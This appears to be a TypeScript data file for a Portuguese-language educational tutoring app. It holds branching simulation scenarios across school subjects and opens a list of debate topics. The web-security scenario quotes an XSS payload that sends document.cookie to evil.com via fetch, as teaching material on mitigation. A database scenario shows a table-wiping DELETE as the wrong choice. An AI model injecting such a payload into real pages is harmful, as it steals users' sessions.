import {
  Calculator,
  Dna,
  Atom,
  Globe,
  Users,
  Network,
  FlaskConical,
  Database,
  PenTool,
  Code,
  Landmark,
  Cpu,
  Palette,
  HeartHandshake,
  LucideIcon
} from "lucide-react";

export interface SimulationStepChoice {
  id: string;
  label: string;
  consequence: string;
  metricsDelta: { stability: number; confidence: number; rigor: number };
  learningNote: string;
  isOptimal?: boolean;
}

export interface SimulationStep {
  round: number;
  tutorMasterPrompt: string;
  choices: SimulationStepChoice[];
}

export interface SimulationScenario {
  id: string;
  disciplineId: string;
  disciplineName: string;
  title: string;
  domain: string;
  icon: LucideIcon;
  badgeColor: string;
  brief: string;
  steps: SimulationStep[];
}

export interface DebateTopic {
  id: string;
  disciplineId: string;
  disciplineName: string;
  title: string;
  theme: string;
  starterPrompt: string;
  tutorCounterArg: string;
  mappedDifficulty: string;
}

// 14 CENÁRIOS PRÁTICOS COMPLETOS DO LABORATÓRIO DE SIMULAÇÃO VIVA
export const ALL_14_SIMULATION_SCENARIOS: SimulationScenario[] = [
  {
    id: "scen-matematica",
    disciplineId: "matematica",
    disciplineName: "Matemática",
    title: "Otimização Algébrica: Modelagem Parabólica de Trajetória e Lucro Máximo",
    domain: "Matemática Aplicada",
    icon: Calculator,
    badgeColor: "bg-blue-500/20 text-blue-300 border-blue-500/30",
    brief: "Você é o analista responsável por calcular a curva parabólica de receita de uma cooperativa tecnológica que comercializa sensores agrícolas. É preciso determinar o ponto de vértice máximo e prever o discriminante Delta sob variações de custos.",
    steps: [
      {
        round: 1,
        tutorMasterPrompt: "📐 [Mestre TutorIA]: A função de receita líquida estimada é R(x) = -2x² + 80x - 600, onde x representa a tiragem em centenas de peças. A diretoria quer saber se a operação é viável (Δ > 0) e qual é o preço ótimo de equilíbrio. Qual cálculo algébrico você executa primeiro?",
        choices: [
          {
            id: "mat-c1",
            label: "Calcular o discriminante Δ = b² - 4ac e as coordenadas do vértice (Xv = -b/2a, Yv = -Δ/4a).",
            consequence: "Perfeito! Δ = 6400 - 4800 = 1600 (duas raízes reais positivas x=10 e x=30). O vértice Xv = 20 gera lucro máximo de 200 mil reais!",
            metricsDelta: { stability: 35, confidence: 30, rigor: 40 },
            learningNote: "O discriminante positivo confirma viabilidade econômica entre 10 e 30 unidades, e o vértice representa o ponto de máxima eficiência da parábola com concavidade para baixo.",
            isOptimal: true
          },
          {
            id: "mat-c2",
            label: "Adotar a média aritmética simples entre os coeficientes a e c e fixar o preço em x = 50.",
            consequence: "Erro de modelagem! Para x = 50, R(50) = -2(2500) + 4000 - 600 = -1600. A empresa entra em prejuízo severo!",
            metricsDelta: { stability: -30, confidence: -25, rigor: -30 },
            learningNote: "Funções quadráticas não respondem a extrapolações lineares; ignorar o termo quadrático e o vértice gera colapso financeiro.",
            isOptimal: false
          }
        ]
      },
      {
        round: 2,
        tutorMasterPrompt: "📊 [Mestre TutorIA]: Um imposto repentino eleva os custos fixos, alterando a função para R(x) = -2x² + 80x - 850. Agora Δ = 6400 - 6800 = -400. Os diretores perguntam: 'Ainda teremos lucro se vendermos mais?'. Qual é a sua resposta técnica fundamentada?",
        choices: [
          {
            id: "mat-c3",
            label: "Explicar que como Δ < 0 e a < 0, a parábola está inteiramente abaixo do eixo das abscissas, sem lucros reais em nenhuma quantidade.",
            consequence: "Diagnóstico matematicamente impecável! A equipe evitou fabricação no escuro e renegociou fornecedores.",
            metricsDelta: { stability: 30, confidence: 35, rigor: 40 },
            learningNote: "Com discriminante negativo e coeficiente a negativo, a parábola não intercepta o eixo x e permanece no semiplano negativo para todo x real.",
            isOptimal: true
          },
          {
            id: "mat-c4",
            label: "Dizer para quadruplicar a produção para 100 centenas para diluir os custos fixos.",
            consequence: "O prejuízo se multiplicou por dez devido ao termo quadrático negativo.",
            metricsDelta: { stability: -35, confidence: -30, rigor: -25 },
            learningNote: "Quando o gráfico está no semiplano negativo, aumentar x apenas acelera as perdas.",
            isOptimal: false
          }
        ]
      }
    ]
  },
  {
    id: "scen-biologia",
    disciplineId: "biologia",
    disciplineName: "Biologia",
    title: "Crise de Bioengenharia: Transcrição, Tradução Gênica e Mutações",
    domain: "Genética Molecular",
    icon: Dna,
    badgeColor: "bg-emerald-500/20 text-emerald-300 border-emerald-500/30",
    brief: "Em um laboratório de biotecnologia agrícola, uma linhagem de soja geneticamente editada para resistir à seca parou de sintetizar a proteína chaperona de choque térmico devido a uma mutação por deleção.",
    steps: [
      {
        round: 1,
        tutorMasterPrompt: "🧬 [Mestre TutorIA]: O sequenciamento genético da fita molde de DNA revelou a deleção de uma única timina (T) na 4ª posição da sequência codificadora inicial: TAC TGA CGA... Como essa alteração pontual afeta o RNA mensageiro e a cadeia polipeptídica?",
        choices: [
          {
            id: "bio-c1",
            label: "Identificar que a deleção de 1 nucleotídeo causa 'frameshift' (mudança no quadro de leitura), alterando todos os códons subsequentes e gerando códon de terminação precoce.",
            consequence: "Análise molecular perfeita! Você identificou a perda de função por truncamento precoce da proteína.",
            metricsDelta: { stability: 35, confidence: 30, rigor: 40 },
            learningNote: "Mutações do tipo frameshift (inserção ou deleção de bases não múltiplas de 3) desalinham os tripletos de códons lidos pelo ribossomo.",
            isOptimal: true
          },
          {
            id: "bio-c2",
            label: "Afirmar que a deleção é silenciosa porque o código genético é degenerado e nada muda.",
            consequence: "Erro grave! Mutações silenciosas ocorrem quando um códon substituto codifica o mesmo aminoácido, o que não ocorre na perda de uma base.",
            metricsDelta: { stability: -25, confidence: -20, rigor: -30 },
            learningNote: "O código degenerado só protege de certas substituições pontuais, nunca de deleções que alteram toda a fase de leitura.",
            isOptimal: false
          }
        ]
      }
    ]
  },
  {
    id: "scen-fisica",
    disciplineId: "fisica",
    disciplineName: "Física",
    title: "Dinâmica Orbital e Resgate Espacial: Leis de Newton e Conservação da Quantidade de Movimento",
    domain: "Mecânica Clássica",
    icon: Atom,
    badgeColor: "bg-cyan-500/20 text-cyan-300 border-cyan-500/30",
    brief: "Um microssatélite educacional perdeu propulsão após um impacto com lixo espacial. Como controlador de voo, você deve desacelerá-lo para reentrada controlada usando pulsos de gás nitrogênio.",
    steps: [
      {
        round: 1,
        tutorMasterPrompt: "🚀 [Mestre TutorIA]: O satélite de massa m = 50 kg move-se a 7.500 m/s no vácuo orbital. Você precisa aplicar uma desaceleração controlada de Δv = -15 m/s. Baseado na 3ª Lei de Newton (Ação e Reação) e na Conservação do Momento Linear, como você orienta os propulsores?",
        choices: [
          {
            id: "fis-c1",
            label: "Ejetar massa de gás nitrogênio na mesma direção e sentido do vetor velocidade orbital para criar empuxo retrógrado contrário.",
            consequence: "Manobra executada com precisão física! Pelo princípio de ação e reação (F_satélite = -F_gás), o satélite desacelerou para a órbita correta.",
            metricsDelta: { stability: 35, confidence: 35, rigor: 40 },
            learningNote: "Na ausência de forças externas no espaço, expelir matéria para frente gera uma força resultante oposta no corpo (3ª Lei de Newton).",
            isOptimal: true
          },
          {
            id: "fis-c2",
            label: "Disparar o gás para trás, esperando que o atrito com o ar do espaço freie a espaçonave.",
            consequence: "No vácuo espacial não há atmosfera para atrito; o satélite acelerou para 7.515 m/s e se perdeu!",
            metricsDelta: { stability: -35, confidence: -30, rigor: -30 },
            learningNote: "No vácuo orbital a resistência do ar é nula; disparar propulsores para trás gera aceleração para a frente (2ª e 3ª leis).",
            isOptimal: false
          }
        ]
      }
    ]
  },
  {
    id: "scen-geografia",
    disciplineId: "geografia",
    disciplineName: "Geografia",
    title: "Gestão Hídrica e Geopolítica das Bacias Hidrográficas em Cenário de Estiagem",
    domain: "Geografia Física & Humana",
    icon: Globe,
    badgeColor: "bg-teal-500/20 text-teal-300 border-teal-500/30",
    brief: "Uma estiagem prolongada na Bacia do Rio São Francisco e no Sistema Cantareira obriga o comitê intermunicipal a tomar decisões de transposição e racionamento equilibrado entre agronegócio, geração hidrelétrica e consumo urbano.",
    steps: [
      {
        round: 1,
        tutorMasterPrompt: "🌍 [Mestre TutorIA]: O volume útil dos reservatórios caiu para 12%. O setor elétrico pede vazão defluente máxima para evitar apagão, enquanto as cidades jusante exigem vazão ecológica mínima para evitar salinização da foz e falta de água potável. Qual diretriz você aplica com base na Política Nacional de Recursos Hídricos (Lei 9.433/97)?",
        choices: [
          {
            id: "geo-c1",
            label: "Aplicar a prioridade legal inegociável da Lei das Águas: consumo humano e dessedentação de animais têm primazia absoluta em escassez crítica.",
            consequence: "Decisão fundamentada no arcabouço geográfico e socioambiental! O abastecimento público foi garantido e foram acionadas termoelétricas emergenciais.",
            metricsDelta: { stability: 35, confidence: 35, rigor: 40 },
            learningNote: "A Lei 9.433/97 estabelece a bacia como unidade de planejamento e o uso múltiplo, mas fixa o consumo humano como prioridade máxima em estresse hídrico.",
            isOptimal: true
          },
          {
            id: "geo-c2",
            label: "Liberar toda a água para as turbinas hidrelétricas visando bater recorde de receita de energia.",
            consequence: "Os leitos inferiores secaram, ribeirinhos ficaram desabastecidos e a intrusão salina contaminou os aquíferos litorâneos.",
            metricsDelta: { stability: -35, confidence: -30, rigor: -25 },
            learningNote: "Priorizar geração de energia sobre a vazão ecológica e abastecimento humano viola os tratados de governança ambiental da bacia.",
            isOptimal: false
          }
        ]
      }
    ]
  },
  {
    id: "scen-sociologia",
    disciplineId: "sociologia",
    disciplineName: "Sociologia",
    title: "Mediação de Conflito Urbano e Cidadania: Trabalho Plataformizado e Direitos",
    domain: "Sociologia do Trabalho",
    icon: Users,
    badgeColor: "bg-purple-500/20 text-purple-300 border-purple-500/30",
    brief: "Uma paralisação em massa de entregadores e motoristas de aplicativo por condições de segurança e remuneração paralisa as avenidas centrais. Como sociólogo mediador em uma comissão pública, você deve propor um pacto de regulação.",
    steps: [
      {
        round: 1,
        tutorMasterPrompt: "👥 [Mestre TutorIA]: As plataformas alegam que os trabalhadores são 'empreendedores autônomos flexíveis' sob o livre mercado, enquanto os sindicatos denunciam a 'uberização' como precarização do trabalho e perda de proteção previdenciária. Sob a ótica teórica de Émile Durkheim (solidariedade social) e Karl Marx (mais-valia), qual encaminhamento você formula?",
        choices: [
          {
            id: "soc-c1",
            label: "Propor uma regulação com piso tarifário, inclusão obrigatória na seguridade social (INSS) e seguro contra acidentes custeado pelas plataformas.",
            consequence: "Construção de consenso sociológico de alto nível! Garantiram-se direitos fundamentais preservando a atividade econômica com justiça social.",
            metricsDelta: { stability: 35, confidence: 35, rigor: 35 },
            learningNote: "O fenômeno da uberização reconfigura as relações de classe; sem regulação institucional, instala-se a anomia e a hiperprecarização.",
            isOptimal: true
          },
          {
            id: "soc-c2",
            label: "Negar qualquer diálogo e considerar o protesto como mero delito de trânsito.",
            consequence: "A greve se intensificou, houve choque violento e a ruptura do tecido social se aprofundou.",
            metricsDelta: { stability: -30, confidence: -35, rigor: -25 },
            learningNote: "Ignorar as demandas coletivas agrava conflitos estruturais e ignora a função integradora do direito e da cidadania.",
            isOptimal: false
          }
        ]
      }
    ]
  },
  {
    id: "scen-analise-projeto-sistemas",
    disciplineId: "analise-projeto-sistemas",
    disciplineName: "Análise e Projeto de Sistemas",
    title: "Crise de Arquitetura de Software: Migração Monólito para Microsserviços",
    domain: "Engenharia de Software",
    icon: Network,
    badgeColor: "bg-indigo-500/20 text-indigo-300 border-indigo-500/30",
    brief: "O sistema legado de matrículas de uma rede de 50 escolas sofre de acoplamento extremo. Uma alteração no módulo financeiro derrubou as notas e presenças de 30.000 estudantes.",
    steps: [
      {
        round: 1,
        tutorMasterPrompt: "💻 [Mestre TutorIA]: Como arquiteto de sistemas, você precisa definir o padrão de decomposição da aplicação e a comunicação entre os domínios. Qual padrão você prescreve para garantir baixo acoplamento e alta coesão?",
        choices: [
          {
            id: "aps-c1",
            label: "Adotar Domain-Driven Design (DDD) com Bounded Contexts e mensageria assíncrona (RabbitMQ/Kafka) para eventos de domínio.",
            consequence: "Excelente escolha arquitetural! Falhas em um serviço financeiro não mais derrubam a plataforma pedagógica, com resiliência distribuída!",
            metricsDelta: { stability: 40, confidence: 35, rigor: 40 },
            learningNote: "O desacoplamento por eventos (Event-Driven Architecture) e limites de contexto do DDD garantem autonomia de deploy e escalabilidade.",
            isOptimal: true
          },
          {
            id: "aps-c2",
            label: "Compartilhar o mesmo banco de dados com 40 tabelas sem chaves e fazer chamadas síncronas HTTP em loop contínuo.",
            consequence: "Colapso em cascata! O banco saturou e o tempo de resposta aumentou para 25 segundos.",
            metricsDelta: { stability: -30, confidence: -25, rigor: -30 },
            learningNote: "O antipattern 'Monólito Distribuído' combina as piores características de monólitos e microsserviços sem os benefícios de nenhum.",
            isOptimal: false
          }
        ]
      }
    ]
  },
  {
    id: "scen-quimica",
    disciplineId: "quimica",
    disciplineName: "Química",
    title: "Contenção de Reação Exotérmica Industrial: Termoquímica e Lei de Hess",
    domain: "Físico-Química",
    icon: FlaskConical,
    badgeColor: "bg-orange-500/20 text-orange-300 border-orange-500/30",
    brief: "No reator de síntese de amônia pelo processo Haber-Bosch (N₂ + 3H₂ ⇌ 2NH₃), a temperatura interna dispara devido à natureza fortemente exotérmica (ΔH = -92 kJ/mol). O risco de explosão e desvio de equilíbrio é iminente.",
    steps: [
      {
        round: 1,
        tutorMasterPrompt: "⚗️ [Mestre TutorIA]: O termômetro acusa 580 °C. O alarme soa! Baseado no Princípio de Le Chatelier e na Termoquímica, se você apenas aumentar a temperatura, o que acontecerá com o rendimento da amônia e com a estabilidade do reator?",
        choices: [
          {
            id: "qui-c1",
            label: "Ativar resfriamento externo na jaqueta e aumentar a pressão: o resfriamento favorece a reação direta exotérmica e a pressão desloca para menor volume molar.",
            consequence: "Domínio termoquímico magistral! A temperatura foi estabilizada em 450 °C e o rendimento de amônia subiu com segurança total.",
            metricsDelta: { stability: 40, confidence: 35, rigor: 40 },
            learningNote: "Reações exotérmicas liberam calor (ΔH < 0). Abaixar a temperatura desloca o equilíbrio no sentido dos produtos (formação de NH₃).",
            isOptimal: true
          },
          {
            id: "qui-c2",
            label: "Aquecer ainda mais para 'acelerar a queima' dos reagentes.",
            consequence: "O aquecimento deslocou a reação no sentido endotérmico inverso, destruindo a amônia e sobrecarregando a válvula de alívio por sobrepressão!",
            metricsDelta: { stability: -40, confidence: -30, rigor: -35 },
            learningNote: "Fornecer calor a uma reação exotérmica desfavorece os produtos e gera risco catastrófico em recipientes fechados.",
            isOptimal: false
          }
        ]
      }
    ]
  },
  {
    id: "scen-banco-de-dados",
    disciplineId: "banco-de-dados",
    disciplineName: "Banco de Dados",
    title: "Auditoria de Integridade Relacional e Otimização de Consultas SQL",
    domain: "Bancos de Dados Relacionais",
    icon: Database,
    badgeColor: "bg-emerald-500/20 text-emerald-300 border-emerald-500/30",
    brief: "Durante o fechamento letivo, o relatório geral de notas travou por timeout. Foram descobertos registros órfãos e ausência de chaves estrangeiras.",
    steps: [
      {
        round: 1,
        tutorMasterPrompt: "🗄️ [Mestre TutorIA]: A tabela de avaliações possui 2 milhões de linhas e não há índice nas colunas (aluno_id, disciplina_id). A query com JOIN triplo executa em 42 segundos com lock na tabela. Qual comando DDL/DQL você aplica para sanar o problema?",
        choices: [
          {
            id: "bd-c1",
            label: "Executar 'CREATE INDEX idx_avaliacoes_aluno_disc ON avaliacoes(aluno_id, disciplina_id);' e aplicar foreign keys com ON DELETE RESTRICT.",
            consequence: "Sucesso estrondoso! O tempo de resposta despencou de 42.000ms para 14ms e a integridade referencial foi restabelecida.",
            metricsDelta: { stability: 40, confidence: 35, rigor: 40 },
            learningNote: "Índices compostos B-Tree reduzem a complexidade de busca de O(n) para O(log n), eliminando Full Table Scans custosos.",
            isOptimal: true
          },
          {
            id: "bd-c2",
            label: "Apagar os registros antigos com 'DELETE FROM avaliacoes WHERE 1=1' para a tabela ficar menor.",
            consequence: "Desastre pedagógico! O histórico acadêmico da turma foi apagado sem backup!",
            metricsDelta: { stability: -50, confidence: -45, rigor: -40 },
            learningNote: "Nunca remova dados produtivos para resolver lentidão de leitura; a solução é indexação e particionamento.",
            isOptimal: false
          }
        ]
      }
    ]
  },
  {
    id: "scen-lingua-portuguesa-redacao",
    disciplineId: "lingua-portuguesa-redacao",
    disciplineName: "Língua Portuguesa & Redação",
    title: "Julgamento Textual e Coesão: Avaliação Crítica da Competência 3 do ENEM",
    domain: "Linguística & Argumentação",
    icon: PenTool,
    badgeColor: "bg-rose-500/20 text-rose-300 border-rose-500/30",
    brief: "Como revisor do conselho pedagógico de redações nota 1000, você deve avaliar um ensaio dissertativo-argumentativo cujo projeto de texto corre risco de tangenciamento temático e incoerência interparágrafos.",
    steps: [
      {
        round: 1,
        tutorMasterPrompt: "✍️ [Mestre TutorIA]: O estudante redigiu: 'A inteligência artificial transformará o mercado. Ademais, as pessoas preferem trabalhar remotamente, embora a internet no Brasil tenha custo elevado.'. Como você orienta o estudante para atingir os 200 pontos nas Competências 3 e 4?",
        choices: [
          {
            id: "port-c1",
            label: "Explicar que os conectivos ('Ademais', 'Embora') não estabelecem progressão temática consistente e orientar a articulação causa-consequência vinculada à tese principal.",
            consequence: "Feedback formativo exemplar! O aluno compreendeu como organizar operadores argumentativos e reconstruiu o parágrafo com coesão sequencial perfeita.",
            metricsDelta: { stability: 35, confidence: 40, rigor: 40 },
            learningNote: "A Competência 4 exige encadeamento coesivo interparágrafos e interfrasal, enquanto a 3 avalia o projeto de texto e a consistência dos argumentos.",
            isOptimal: true
          },
          {
            id: "port-c2",
            label: "Dizer apenas para trocar 'Ademais' por 'Portanto' e manter o resto sem justificativa teórica.",
            consequence: "A redação continuou desconexa e perdeu 80 pontos na banca oficial.",
            metricsDelta: { stability: -20, confidence: -25, rigor: -20 },
            learningNote: "Correções superficiais sem diagnóstico do projeto de texto não capacitam o aluno para a autonomia discursiva.",
            isOptimal: false
          }
        ]
      }
    ]
  },
  {
    id: "scen-desenvolvimento-web",
    disciplineId: "desenvolvimento-web",
    disciplineName: "Desenvolvimento Web",
    title: "Vulnerabilidade Crítica de Segurança Web: XSS, CSRF e Sanitização de Estado",
    domain: "Frontend & Segurança Web",
    icon: Code,
    badgeColor: "bg-indigo-500/20 text-indigo-300 border-indigo-500/30",
    brief: "Um relatório de pentest revelou que a aplicação web estudantil possui uma falha de Cross-Site Scripting (XSS) no mural de dúvidas e vazamento de tokens JWT pelo localStorage.",
    steps: [
      {
        round: 1,
        tutorMasterPrompt: "🌐 [Mestre TutorIA]: Um invasor injetou uma tag '<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>' no campo de comentários que foi renderizado com 'dangerouslySetInnerHTML'. Qual é a ação imediata de correção?",
        choices: [
          {
            id: "web-c1",
            label: "Remover a injeção crua de HTML, utilizar sanitização com DOMPurify e migrar tokens de autenticação para cookies HttpOnly com SameSite=Strict.",
            consequence: "Vulnerabilidade mitigada com padrões OWASP Top 10! A aplicação agora é blindada contra roubo de sessão e injeção de scripts.",
            metricsDelta: { stability: 40, confidence: 35, rigor: 40 },
            learningNote: "Cookies com flag HttpOnly não podem ser acessados via JavaScript (document.cookie), neutralizando a exfiltração de credenciais por XSS.",
            isOptimal: true
          },
          {
            id: "web-c2",
            label: "Apenas colocar um alert('Atenção: não use scripts') e continuar usando dangerouslySetInnerHTML.",
            consequence: "Ataque automatizado exfiltrou centenas de sessões ativas.",
            metricsDelta: { stability: -40, confidence: -35, rigor: -30 },
            learningNote: "Segurança web exige validação rigorosa no servidor e sanitização no cliente; avisos não contêm código malicioso.",
            isOptimal: false
          }
        ]
      }
    ]
  },
  {
    id: "scen-historia",
    disciplineId: "historia",
    disciplineName: "História",
    title: "Abertura Política e Transição Democrática: As 'Diretas Já' e a Carta de 1988",
    domain: "História do Brasil Contemporâneo",
    icon: Landmark,
    badgeColor: "bg-amber-500/20 text-amber-300 border-amber-500/30",
    brief: "Ano de 1984/1985. Como assessor parlamentar durante a votação da Emenda Dante de Oliveira, você deve orientar a estratégia política das oposições frente ao Colégio Eleitoral e à articulação da Aliança Democrática.",
    steps: [
      {
        round: 1,
        tutorMasterPrompt: "🏛️ [Mestre TutorIA]: A Emenda das Diretas Já não alcançou os dois terços necessários na Câmara por falta de quórum do PDS. A oposição debate: boicotar o Colégio Eleitoral indireto ou lançar a chapa Tancredo Neves / José Sarney para derrotar o regime por dentro? Qual análise histórica você defende?",
        choices: [
          {
            id: "hist-c1",
            label: "Participar do Colégio Eleitoral pela Aliança Democrática, unindo o PMDB e dissidentes da Frente Liberal para viabilizar a vitória civil e a convocação da Constituinte.",
            consequence: "Caminho histórico vitorioso! A transição pacífica levou à posse civil e pavimentou a promulgação da 'Constituição Cidadã' de 1988.",
            metricsDelta: { stability: 35, confidence: 35, rigor: 40 },
            learningNote: "A transição brasileira foi 'lenta, gradual e segura', articulada por negociações no próprio Colégio Eleitoral para desmontar o autoritarismo militar.",
            isOptimal: true
          },
          {
            id: "hist-c2",
            label: "Declarar greve geral armada e dissolver o parlamento sem negociação.",
            consequence: "Houve repressão militar dura, prorrogação do estado de emergência e atraso no retorno da democracia.",
            metricsDelta: { stability: -35, confidence: -30, rigor: -25 },
            learningNote: "A conjuntura de 1984 carecia de sustentação militar para confronto armado; a via institucional foi decisiva para a redemocratização.",
            isOptimal: false
          }
        ]
      }
    ]
  },
  {
    id: "scen-robotica",
    disciplineId: "robotica",
    disciplineName: "Robótica & Sistemas Embarcados",
    title: "Falha de Telemetria e Controle PID em Veículo Autônomo com Arduino",
    domain: "Sistemas Embarcados & IoT",
    icon: Cpu,
    badgeColor: "bg-sky-500/20 text-sky-300 border-sky-500/30",
    brief: "Um robô móvel seguidor de linha para distribuição de medicamentos hospitalares começa a oscilar violentamente nas curvas e sai da pista.",
    steps: [
      {
        round: 1,
        tutorMasterPrompt: "🤖 [Mestre TutorIA]: O sensor óptico analógico envia leituras ruidosas para o microcontrolador via interrupção a cada 5ms. O algoritmo usa controle puramente proporcional (P) com ganho Kp excessivo. Como você estabiliza o carrinho?",
        choices: [
          {
            id: "rob-c1",
            label: "Implementar filtro de média móvel nas leituras dos sensores, reduzir Kp e adicionar termo Derivativo (Kd) para amortecer as oscilações bruscas.",
            consequence: "O robô percorreu o circuito com suavidade milimétrica! O controle PID estabilizou a velocidade angular e reduziu o overshoot a zero.",
            metricsDelta: { stability: 40, confidence: 35, rigor: 40 },
            learningNote: "O termo derivativo (Kd) antecipa a taxa de variação do erro, amortecendo a resposta do sistema contra sobressinais em curvas.",
            isOptimal: true
          },
          {
            id: "rob-c2",
            label: "Aumentar a potência máxima dos motores para 'vencer a curva na força bruta'.",
            consequence: "O robô colidiu contra a parede hospitalar e quebrou os suportes dos sensores.",
            metricsDelta: { stability: -35, confidence: -30, rigor: -30 },
            learningNote: "Aumentar potência com sistema de controle oscilante amplifica instabilidades e leva a falhas físicas.",
            isOptimal: false
          }
        ]
      }
    ]
  },
  {
    id: "scen-design-de-interface",
    disciplineId: "design-de-interface",
    disciplineName: "Design de Interface (UI/UX)",
    title: "Auditoria de Acessibilidade WCAG 2.1 e Arquitetura de Informação",
    domain: "Design de Produto Digital",
    icon: Palette,
    badgeColor: "bg-pink-500/20 text-pink-300 border-pink-500/30",
    brief: "A plataforma governamental de serviços cidadãos foi reprovada em teste com usuários cegos e daltônicos. O índice de contraste caiu abaixo de 2:1 e botões carecem de rótulos semânticos.",
    steps: [
      {
        round: 1,
        tutorMasterPrompt: "🎨 [Mestre TutorIA]: O botão de 'Confirmar Benefício' é apenas um círculo vermelho sem texto, com contraste de 1.8:1 sobre fundo cinza e sem atributo aria-label. Como você reformula o componente segundo as diretrizes WCAG nível AA?",
        choices: [
          {
            id: "ui-c1",
            label: "Aplicar contraste mínimo de 4.5:1 para texto/ícone, adicionar texto visível explícito + aria-label e garantir foco navegável por teclado com outline contrastante.",
            consequence: "Acessibilidade nota 100! Usuários com leitor de tela (NVDA) e baixa visão conseguiram concluir o cadastro sem barreiras.",
            metricsDelta: { stability: 35, confidence: 40, rigor: 40 },
            learningNote: "A WCAG 2.1 AA exige contraste mínimo de 4.5:1 para texto normal, dependência zero de apenas cor para transmitir significado e foco acessível.",
            isOptimal: true
          },
          {
            id: "ui-c2",
            label: "Diminuir o tamanho do botão para caber mais anúncios na tela.",
            consequence: "A taxa de erro em telas sensíveis ao toque subiu para 68% devido a alvos de toque menores que 44x44px.",
            metricsDelta: { stability: -30, confidence: -35, rigor: -25 },
            learningNote: "Alvos de toque devem ter no mínimo 44x44 pixels para acessibilidade motora em dispositivos móveis.",
            isOptimal: false
          }
        ]
      }
    ]
  },
  {
    id: "scen-empreendedorismo-social",
    disciplineId: "empreendedorismo-social",
    disciplineName: "Empreendedorismo Social",
    title: "Estruturação de Modelo de Negócio de Impacto Social e Captação ESG",
    domain: "Gestão Social & Inovação",
    icon: HeartHandshake,
    badgeColor: "bg-amber-500/20 text-amber-300 border-amber-500/30",
    brief: "Uma cooperativa de catadoras de materiais recicláveis em periferia urbana deseja captar financiamento internacional através do Social Business Model Canvas.",
    steps: [
      {
        round: 1,
        tutorMasterPrompt: "🌱 [Mestre TutorIA]: Para atrair fundos de investimento de impacto (ESG), a cooperativa precisa comprovar métricas de dupla rentabilidade: sustentabilidade financeira e benefício socioambiental mensurável. Qual indicador você estrutura como proposta central de valor?",
        choices: [
          {
            id: "emp-c1",
            label: "Construir a Teoria da Mudança e medir o Retorno Social sobre o Investimento (SROI), calculando toneladas de plástico desviadas de lixões e renda média digna das catadoras.",
            consequence: "A proposta recebeu aporte de 500 mil reais do fundo internacional, com validação técnica de impacto!",
            metricsDelta: { stability: 40, confidence: 35, rigor: 40 },
            learningNote: "Negócios de impacto diferem da filantropia porque geram receita própria através de produtos/serviços, resolvendo um problema social em escala.",
            isOptimal: true
          },
          {
            id: "emp-c2",
            label: "Prometer lucros de 800% no primeiro mês como se fosse uma startup especulativa.",
            consequence: "O fundo rejeitou a proposta por falta de seriedade metodológica e ausência de compromisso com a comunidade.",
            metricsDelta: { stability: -35, confidence: -30, rigor: -25 },
            learningNote: "Investidores de impacto exigem transparência de governança e métricas de impacto socioambiental reais (ESG), não promessas infladas.",
            isOptimal: false
          }
        ]
      }
    ]
  }
];

// 14 TEMAS DE DEBATE SOCRÁTICO COMPLETOS
export const ALL_14_DEBATE_TOPICS: DebateTopic[] = [
  {
    id: "deb-matematica",
    disciplineId: "matematica",
    disciplineName: "Matemática",
    title: "A Matemática é uma Descoberta da Realidade Natural ou uma Invenção Humana?",
    theme: "Epistemologia da Matemática",
    starterPrompt: "Defenda seu ponto de vista: as verdades matemáticas (como a fórmula de Bhaskara, os números irracionais e o teorema de Pitágoras) já existiam no universo antes da humanidade e foram descobertas, ou são meras linguagens inventadas pelo cérebro humano para organizar percepções?",
    tutorCounterArg: "Se você sustenta que a matemática é uma pura invenção linguística humana, como explica que equações matemáticas complexas prevejam fenômenos astronômicos (como buracos negros e ondas gravitacionais) décadas antes de qualquer ser humano conseguir observá-los fisicamente?",
    mappedDifficulty: "Dificuldade na Sessão de Debates: Relação entre abstração algébrica e realidade física"
  },
  {
    id: "deb-biologia",
    disciplineId: "biologia",
    disciplineName: "Biologia",
    title: "Edição Genética Humana com CRISPR: Cura de Doenças ou Eugenia Moderna?",
    theme: "Bioética & Genômica",
    starterPrompt: "A edição do genoma humano com a técnica CRISPR-Cas9 em células embrionárias deve ser autorizada para erradicar doenças hereditárias graves, ou deve ser proibida por abrir precedentes irreversíveis de eugenia social e desigualdade biológica?",
    tutorCounterArg: "Você defende a proibição irrestrita para evitar eugenia. Contudo, sob o princípio da beneficência médica, se possuímos a tecnologia comprovada para poupar uma criança de nascer com distrofia muscular fatal ou anemia falciforme, negar-lhe essa intervenção prévia não configura negligência ética?",
    mappedDifficulty: "Dificuldade na Sessão de Debates: Limites bioéticos da manipulação gênica germinativa"
  },
  {
    id: "deb-fisica",
    disciplineId: "fisica",
    disciplineName: "Física",
    title: "Energia Nuclear na Transição Climática: Solução Limpa ou Risco Inaceitável?",
    theme: "Física Nuclear & Matriz Energética",
    starterPrompt: "Frente à urgência climática global e à necessidade de zerar as emissões de carbono, as usinas nucleares devem ser expandidas massivamente como energia de base limpa ou banidas devido ao perigo de acidentes e resíduos radioativos de milênios?",
    tutorCounterArg: "Embora os resíduos demandem isolamento profundo, a energia nuclear apresenta a menor pegada territorial e de mortes por gigawatt-hora gerado em comparação aos combustíveis fósseis e hidrelétricas. Como você garante estabilidade da rede elétrica sem queimar carvão ou gás quando não há sol ou vento?",
    mappedDifficulty: "Dificuldade na Sessão de Debates: Balanço termodinâmico e densidade energética na matriz limpa"
  },
  {
    id: "deb-geografia",
    disciplineId: "geografia",
    disciplineName: "Geografia",
    title: "Soberania Nacional vs. Internacionalização da Governança da Amazônia",
    theme: "Geopolítica Ambiental",
    starterPrompt: "A Amazônia deve permanecer sob jurisdição e exploração e preservação estritamente nacional e soberana dos países amazônicos, ou deve ser submetida a mecanismos de governança e fiscalização compartilhada global como patrimônio climático da humanidade?",
    tutorCounterArg: "Se você defende a soberania irrestrita sem fiscalização global, como o direito internacional responde aos efeitos transfronteiriços dos 'rios voadores' e da captura de carbono que afetam o regime de chuvas e a segurança alimentar de todo o hemisfério sul?",
    mappedDifficulty: "Dificuldade na Sessão de Debates: Conflito entre soberania estatal e tratados ambientais globais"
  },
  {
    id: "deb-sociologia",
    disciplineId: "sociologia",
    disciplineName: "Sociologia",
    title: "A Meritocracia em Sociedades com Desigualdade Estrutural: Mito ou Realidade?",
    theme: "Estratificação Social",
    starterPrompt: "O sucesso acadêmico e profissional em países de profunda desigualdade histórica como o Brasil é fruto do mérito e esforço individual ou reflexo direto da reprodução do capital econômico e cultural das famílias de origem?",
    tutorCounterArg: "Se a estrutura social determina categoricamente o destino dos indivíduos, como a sociologia explica os casos comprovados de mobilidade social ascendente de jovens da periferia por meio da educação pública e do esforço pessoal?",
